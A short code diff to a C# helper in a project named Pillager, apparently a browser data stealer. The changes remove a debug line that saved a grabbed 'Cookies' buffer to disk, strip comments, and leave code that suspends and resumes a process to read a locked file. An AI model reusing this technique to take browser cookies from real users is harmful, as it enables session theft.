@@ -27,7 +27,6 @@ namespace Pillager.Helper
                 Native.CloseHandle(hfile);
                 Native.NtResumeProcess(hProcess);
                 Native.CloseHandle(hProcess);
-                File.WriteAllBytes("Cookies", fileBuffer);
                 return fileBuffer;
             }
             catch { return null; }
@@ -175,13 +174,6 @@ namespace Pillager.Helper
                     return result;
                 }
 
-                // Buffer contains:
-                //    struct FILE_PROCESS_IDS_USING_FILE_INFORMATION
-                //    {
-                //        ULONG NumberOfProcessIdsInList;
-                //        ULONG_PTR ProcessIdList[1];
-                //    }
-
                 IntPtr readBuffer = bufferPtr;
                 int numEntries = Marshal.ReadInt32(readBuffer); // NumberOfProcessIdsInList
                 readBuffer = new IntPtr(readBuffer.ToInt32() + IntPtr.Size);
@@ -207,7 +199,7 @@ namespace Pillager.Helper
         private static IntPtr GetFileHandle(string name)
         {
             return Native.CreateFile(name,
-                0, // "FileAccess.Neither" Read nor Write
+                0,
                 FileShare.Read | FileShare.Write | FileShare.Delete,
                 IntPtr.Zero,
                 FileMode.Open,
